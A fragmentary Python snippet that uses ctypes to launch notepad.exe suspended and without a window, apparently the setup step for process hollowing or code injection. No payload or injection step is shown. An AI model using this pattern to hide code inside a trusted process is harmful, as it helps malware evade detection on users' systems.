...
#config (this are a location where are the notepad , are x64 in this example)
path_notepad=b'C:\\Windows\\System32\\notepad.exe'
#
...
created = CreateProcessA(path_notepad, None, None, None, False, CREATE_SUSPEND | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(process_info))
